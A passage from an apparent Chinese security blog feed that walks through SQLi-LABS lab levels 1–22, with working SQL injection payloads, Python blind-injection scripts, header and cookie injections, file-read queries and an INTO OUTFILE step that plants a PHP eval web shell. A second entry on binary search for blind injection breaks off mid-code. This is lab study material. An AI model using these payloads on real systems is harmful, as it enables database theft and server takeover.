1</span><br></pre></td></tr></table></figure><p>凡是出现这种有回显的报错是感觉是最好做的注入</p><p>常规步骤，<code>暴库-&gt;爆表-&gt;爆列</code><br>这里我们是多写了个单引号导致报错，我们可以从报错看得出来这里是单引号括着id参数<br>所以我们闭合单引号<br>构造我们需要的东西<br><code>http://192.168.100.105/sqlilabs/Less-1/?id=1%27%23</code> 回显正常，说明猜测成功</p><p>去后台看一下语句</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id='$id' LIMIT 0,1"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br></pre></td></tr></table></figure><p>是这样子的，没有任何过滤</p><p>然后开始用order by去猜列数<br><code>http://192.168.100.105/sqlilabs/Less-1/?id=1%27 order by 3%23</code>  得到表中应该是三列(用二分法去慢慢测)</p><p>然后开始用union select去回显某一列的东西<br><code>http://192.168.100.105/sqlilabs/Less-1/?id=-1%27</code> union select 1,2,3%23<br>这里我们需要把第一句话弄成结果为空才能显示后面一句话的内容，这里我选择id=-1，然后的话就可以回显2和3,后面就可以利用这两列回显你想要的东西了</p><p>下面我们就开始要用mysql里面自带的information_schema表了<br>猜表名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-1/?id=-1%27 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()%23</span><br></pre></td></tr></table></figure><p>猜列名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-1/?id=-1%27%20union%20select%201,2,group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=&apos;users&apos;%23</span><br></pre></td></tr></table></figure><p>才猜对应的内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-1/?id=-1%27%20union%20select%201,2,concat_ws(&apos;%23&apos;,username,password)%20from users limit 0,1%23</span><br></pre></td></tr></table></figure><p>这一句话只能猜一行，所以要想看其他行的内容就必须要刷一下limit的内容了</p><h2 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h2><p>很无聊，看一下源代码什么防御都没有</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id=$id LIMIT 0,1"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-2/?id=1 order by 5</span><br></pre></td></tr></table></figure><p>测试得到3列，然后开始闭合，其实这一题直接注释了就好</p><p>直接上语句<br>Payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-2/?id=-1 union select 1,2,3#</span><br></pre></td></tr></table></figure><p>这时候想测什么都可以了</p><h2 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h2><p>输入?id=1’出现报错</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;&apos;1&apos;&apos;) LIMIT 0,1&apos; at line 1</span><br></pre></td></tr></table></figure><p>可以猜测这里应该是一个单引号+括号闭合，测试一下对不对</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-3/?id=1&apos;) %23</span><br></pre></td></tr></table></figure><p>成功回显</p><p>再看看源代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id=('$id') LIMIT 0,1"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br></pre></td></tr></table></figure><p>果然如此</p><p>Payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-3/?id=-1&apos;) union select 1,database(),3%23</span><br></pre></td></tr></table></figure><h2 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h2><p>尝试?id=1’单引号没有报错<br>尝试一下”,发现出现报错</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;&quot;1&quot;&quot;) LIMIT 0,1&apos; at line 1</span><br></pre></td></tr></table></figure><p>猜测是<code>&quot;+）</code>的组合<br>闭合一下试试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-4/?id=1&quot;)%23</span><br></pre></td></tr></table></figure><p>成功回显<br>再看看源代码果然是这样<br>接下来就是payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-4/?id=-1&quot;) union select 1,database(),3%23</span><br></pre></td></tr></table></figure><h2 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h2><p>根据<code>You are in</code>的有无来判断正确<br>输入id=1’出现报错回显<br>猜测是单引号的注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-5/?id=1%27%23</span><br></pre></td></tr></table></figure><p>尝试闭合一下出现回显，这个题目有两种做法，一种是直接尝试盲注，另一种是报错注入<br>首先来一个报错注入的payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-5?id=1&apos; and updatexml(1,concat(0x7e,version(),0x7e),1)%23</span><br></pre></td></tr></table></figure><p>然后再来一个盲注脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># Author:0verWatch</span></span><br><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://192.168.100.102/sqlilabs/Less-5/?id=1%27 and ascii(substr((select database()),&#123;_&#125;,1))=&#123;__&#125; %23"</span></span><br><span class="line"><span class="comment">#注意一下这里使用=去作为判断条件</span></span><br><span class="line"><span class="comment">#url = "http://192.168.100.102/sqlilabs/Less-5/?id=1%27 and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),&#123;_&#125;,1))=&#123;__&#125; %23"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">database = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">65</span>,<span class="number">127</span>):</span><br><span class="line">payload = url.format(_ = i,__ = j)</span><br><span class="line"><span class="comment">#print payload</span></span><br><span class="line">ans  = requests.get(payload)</span><br><span class="line"><span class="comment">#print ans.content</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">'You are in...........'</span> <span class="keyword">in</span> ans.content:</span><br><span class="line"><span class="comment"># database = database + chr(j)</span></span><br><span class="line"><span class="comment"># print database</span></span><br><span class="line">table_name += chr(j)</span><br><span class="line"><span class="keyword">print</span> table_name</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h2><p>输入?id=1’没有任何反应，双引号闭合就好了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqlilabs/Less-6/?id=1&quot;%23</span><br></pre></td></tr></table></figure><p>直接报错即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqlilabs/Less-6/?id=1&quot; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&apos;users&apos; limit 4,1),0x7e),1)%23</span><br></pre></td></tr></table></figure><h2 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h2><p>是测试写文件的功能<br>直接输入单引号出现错误</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax</span><br></pre></td></tr></table></figure><p>这里得提及一下如果要读取以及写文件的话必须得需要权限，这里我借鉴了一部分内容<br>导入导出相关操作</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">load_file(file_name)：读取文件并返回该文件的内容作为一个字符串。</span><br></pre></td></tr></table></figure><p>使用条件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">A.必须有权限读取并且文件可读</span><br><span class="line"></span><br><span class="line">and (select count(*) from mysql.user)&gt;0/* 如果结果返回正常，说明具有读写权限。如果返回错误，则说明管理员给数据库降权。</span><br><span class="line"></span><br><span class="line">B.欲读取文件必须在服务器上。</span><br><span class="line">C.必须指定文件完整的路径</span><br><span class="line">D.欲读取文件必须小于max_allowed_packet。</span><br></pre></td></tr></table></figure><p>实际应用时，文件读取权限是最难满足的，我们有两个难点需要解决：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.绝对物理路径</span><br><span class="line">2.构造有效的畸形语句(报错爆出绝对路径)</span><br></pre></td></tr></table></figure></p><p>实例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">select 1,2,3,4,hex(replace(load_file(char(99,58,92,119,105,110,100,111,119,115,92,114,101,112,97,105,114,92,115,97,109))))</span><br><span class="line">利用hex()将文件导出来，特别是smb文件</span><br><span class="line">-1 union select 1,1,1,load_file(char(99,58,47,98,111,111,116,46,105,110,105))</span><br><span class="line">explain：c:/boot.ini的十六进制是0x633s2f626f6f742e696e69</span><br><span class="line">-1 union select 1,1,1,load_file(C:\\boot.ini)</span><br><span class="line">explain：路径里的/用\\代替</span><br><span class="line">load data file导入数据库</span><br><span class="line">略。</span><br><span class="line">导入到文件中</span><br><span class="line">SELECT INTO OUTFILE ‘file_name’,具体参阅其他文章。</span><br><span class="line">file_name 不能是一个已经存在的文件。</span><br></pre></td></tr></table></figure><p>从源代码里面可以发现是要闭合)的，所以我们就可以这样去写文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqlilabs/Less-7/?id=1&apos;)) union select 1,2,&apos;&lt;?php @eval($_POST[cmd]);?&gt;&apos; into outfile &apos;D:\\phpStudy\\PHPTutorial\\WWW\\sqlilabs\\Less-7\\1.php&apos; --+</span><br></pre></td></tr></table></figure><p>连接成功<br><a href="https://imgchr.com/i/PXe8Ig" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/29/PXe8Ig.md.png" alt="PXe8Ig.md.png"></a></p><h2 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h2><p>这一题源代码里面将有关报错信息全都注释了只能用盲注<br><a href="https://imgchr.com/i/PXetRs" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/29/PXetRs.md.png" alt="PXetRs.md.png"></a><br>先测试发现还是直接一个单号然后加一个注释就可以坐后面的事情了<br>上脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'''http://192.168.100.102/sqlilabs/Less-8/?id=1' and ascii(substr((select database()),&#123;_&#125;,1))</span></span><br><span class="line"><span class="string">&gt;&#123;__&#125; %23'''</span></span><br><span class="line"></span><br><span class="line">database = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">9</span>):</span><br><span class="line">    max = <span class="number">127</span></span><br><span class="line">    min = <span class="number">65</span></span><br><span class="line">    <span class="keyword">while</span> abs(max-min)&gt;<span class="number">1</span>:</span><br><span class="line">    mid = (max+min)//<span class="number">2</span></span><br><span class="line">    payload = url.format(_=i,__=mid)</span><br><span class="line">    ans = requests.get(payload)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'You are in...........'</span> <span class="keyword">in</span> ans.content:</span><br><span class="line">    min = mid</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">    max = mid</span><br><span class="line">    database = database + chr(max)</span><br><span class="line">    <span class="keyword">print</span> database</span><br></pre></td></tr></table></figure><h2 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h2><p>这是一个时间盲注的题目<br>直接单引号闭合加个注释其实就ok了，这里就直接给个爆数据库的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">'''http://127.0.0.1/sqlilabs/Less-8/?id=1'and if(ascii(substr(database(),&#123;_&#125;,1))=&#123;__&#125;,1,sleep(3))--+'''</span></span><br><span class="line"></span><br><span class="line">database = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">10</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">97</span>,<span class="number">127</span>):</span><br><span class="line">        payload = url.format(_=i,__=j)</span><br><span class="line">        <span class="keyword">print</span> payload</span><br><span class="line">        start = time.time()</span><br><span class="line">        ans = requests.get(payload)</span><br><span class="line">        <span class="keyword">if</span> time.time()-start &gt;<span class="number">3</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            database += chr(j)</span><br><span class="line">            <span class="keyword">print</span> database</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h2><p>也是一个时间盲注题目，不过这一题是双引号闭合，把上面的脚本改为双引号就好</p><h2 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h2><p>是一个post表格的界面<br>上来就尝试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&apos; or &apos;1&apos;=&apos;1</span><br><span class="line">passwd=123</span><br></pre></td></tr></table></figure><h2 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h2><p>再尝试Less-11一部分内容，发现不行，没有报错信息<br>尝试双引号<br>出现报错</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">your MySQL server version for the right syntax to use near &apos;&quot;)</span><br></pre></td></tr></table></figure><p>应该是有一个括号的<br>尝试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&quot;) or 1=1 #</span><br><span class="line">passwd=123</span><br></pre></td></tr></table></figure><p>立即过</p><h2 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a>Less-13</h2><p>上一题的单引号版本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&apos;) or 1=1#</span><br><span class="line">passwd=123</span><br></pre></td></tr></table></figure><h2 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&quot; or 1=1#</span><br><span class="line">passwd=123</span><br></pre></td></tr></table></figure><h2 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&apos; or &apos;1&apos;=&apos;1</span><br><span class="line">passwd=123</span><br></pre></td></tr></table></figure><h2 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&quot;) or 1=1#</span><br><span class="line">passwd=123</span><br></pre></td></tr></table></figure><h2 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h2><p>这一体的注入点在password上，这也提醒了我们，注入点不一定是在第一个输入框内还有可能是第二输入框呢！<br>我们也可以从源代码的角度去分析，因为源代码写了个check函数去检查username而password反而漏了写<br>对应的password我们可以用报错注入去实现，用单引号闭合password</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: admin</span><br><span class="line">password:1&apos; and updatexml(1,concat(0x7e,database(),0x7e),1)#</span><br></pre></td></tr></table></figure><p>爆表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)#</span><br></pre></td></tr></table></figure><p>爆列</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&apos;user&apos;),0x7e),1)#</span><br></pre></td></tr></table></figure><p>爆详细信息<br>这时候输入这一句话的时候</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; and updatexml(1,concat(0x7e,(select username from users),0x7e),1)#</span><br></pre></td></tr></table></figure><p>会出现</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You can&apos;t specify target table &apos;users&apos; for update in FROM clause</span><br></pre></td></tr></table></figure><p>这是mysql自身的问题不能同时对一个表又select又update，所以我们得构造另外一个表去子查询</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; and updatexml(1,concat(0x7e,(select username from (select username  from users)b limit 0,1),0x7e),1)#</span><br></pre></td></tr></table></figure><p>介绍一下里面的过滤函数，其他两个很熟悉就不介绍了<br><code>mysql_real_escape_string()</code><br>函数转义SQL 语句中使用的字符串中的特殊字符。<br>下列字符受影响：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">\x00</span><br><span class="line">\n</span><br><span class="line">\r</span><br><span class="line">\</span><br><span class="line">&apos;</span><br><span class="line">&quot;</span><br><span class="line">\x1a</span><br></pre></td></tr></table></figure><p>如果成功，则该函数返回被转义的字符串。如果失败，则返回false。</p><h2 id="Less-18"><a href="#Less-18" class="headerlink" title="Less-18"></a>Less-18</h2><p>一进去就显示ip，可能是http头注入<br>查看源代码我们是要登录进去后才能注入，利用的是insert的那一部分语句<br>先在user-agent那里输入1’ 会出现报错<br><code>MySQL server version for the right syntax to use near &#39;127.0.0.1&#39;, &#39;admin&#39;)&#39;</code><br>再尝试一下<code>1&#39; and &#39;1&#39;=&#39;1</code><br>出现回显没有报错<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Your User Agent is: 1&apos; and &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure></p><p>现在就可以直接使用报错注入了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; and updatexml(1,concat(0x7e,database(),0x7e),1) and &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure><h2 id="Less-19"><a href="#Less-19" class="headerlink" title="Less-19"></a>Less-19</h2><p>从上一题开始这里的每一道题目都需要登陆一下才行<br>这一次回显的是在referer上面<br>尝试在referer上面测试1’ and ‘1’=’1<br>直接回显<br>说明这一次的注入点是在referer上面<br>然后像刚才一样直接报错就好</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer: 1&apos; and updatexml(1,concat(0x7e,(database()),0x7e),1) and &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure><h2 id="Less-20"><a href="#Less-20" class="headerlink" title="Less-20"></a>Less-20</h2><p>登陆后发现很明显的cookie字样猜测应该是cookie注入<br>退出后尝试在http头处尝试cookie</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&apos;;</span><br></pre></td></tr></table></figure><p>出现报错</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;&apos;admin&apos;&apos; LIMIT 0,1&apos; at line 1</span><br></pre></td></tr></table></figure><p>应该是单引号闭合<br>再尝试<br><code>uname=admin&#39; or &#39;1&#39;=&#39;1</code>成功回显<br>下面就很好办了，直接报错注入就好了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&apos; and updatexml(1,concat(0x7e,database(),0x7e),1) or &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure><h2 id="less-21"><a href="#less-21" class="headerlink" title="less-21"></a>less-21</h2><p>这一题明显发现uname那一部分经过了base64加密<br>我们加上单引号再尝试加密发送看一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=YWRtaW4n</span><br></pre></td></tr></table></figure><p>出现跟上一题一样的报错，看来是一样的了，就是加上base64加密而已</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&apos; and updatexml(1,concat(0x7e,database(),0x7e),1) or &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure><p>把上面这一串base64加密就好了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">YWRtaW4nIGFuZCB1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSxkYXRhYmFzZSgpLDB4N2UpLDEpIG9yICcxJz0nMQ==</span><br></pre></td></tr></table></figure><p>直接回显你想要的东西，成功</p><h2 id="Less-22"><a href="#Less-22" class="headerlink" title="Less-22"></a>Less-22</h2><p>这一题就是上一题的套路，只是把单引号笔换成了双引号而已</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=YWRtaW4i</span><br></pre></td></tr></table></figure><p>出现报错<br>直接<code>admin&quot; or &quot;1&quot;=&quot;1</code> 闭合一下加密提交就好</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=YWRtaW4iIG9yICIxIj0iMQ==</span><br></pre></td></tr></table></figure><p>回显正常<br>开始报错注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&quot; and updatexml(1,concat(0x7e,database(),0x7e),1) or &quot;1&quot;=&quot;1</span><br></pre></td></tr></table></figure><p>加密得到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">YWRtaW4iIGFuZCB1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSxkYXRhYmFzZSgpLDB4N2UpLDEpIG9yICIxIj0iMQ==</span><br></pre></td></tr></table></figure><p>回显数据库成功</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>SQLi-LABS Page-1(Basic Challenges)的22题就已经全部完爆了<br>这里面的22道题目都是把一些常见的注入类型给过了一遍，我觉得大概都是四种类型</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">联合查询注入</span><br><span class="line">报错注入</span><br><span class="line">bool盲注</span><br><span class="line">时间盲注</span><br></pre></td></tr></table></figure><p>后面的从18关开始就开始是http头的注入，但无论是什么注入，关键是要找到注入点在哪里，然后用合适的方法去闭合相关语句，然后再用正常的语句去查询你所需要的信息就好了</p>]]></content>
      
      <categories>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>二分查找在sql盲注里面的应用</title>
      <link href="/2018/08/27/bin-search-sql/"/>
      <url>/2018/08/27/bin-search-sql/</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近在重新复习SQL注入用了sqllabs这个靶场，发现在做盲注的时候自己写的脚本，就一直自增去盲注的话时间花费太大，所以就在看了看二分查找在这一方面的应用<br>确实快了不少，很久没有写过小脚本就手有点生疏了，赶紧记录一下<a id="more"></a></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>二分查找又称折半查找，优点是比较次数少，查找速度快，平均性能好；其缺点是要求待查表为有序表，且插入删除困难。因此，折半查找方法适用于不经常变动而查找频繁的有序列表。首先，假设表中元素是按升序排列，将表中间位置记录的关键字与查找关键字比较，如果两者相等，则查找成功；否则利用中间位置记录将表分成前、后两个子表，如果中间位置记录的关键字大于查找关键字，则进一步查找前一子表，否则进一步查找后一子表。重复以上过程，直到找到满足条件的记录，使查找成功，或直到子表不存在为止，此时查找不成功。</p><h3 id="时间复杂度"><a href="#时间复杂度" class="headerlink" title="时间复杂度"></a>时间复杂度</h3><p> 最优时间复杂度：O(1)<br> 最坏时间复杂度：O(logn)</p><p><img src="https://s1.ax1x.com/2018/08/27/Pqwqeg.png" alt="Pqwqeg.png"></p><p>可以自行对比一下两组代码的不同<br>这是自增的写法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span 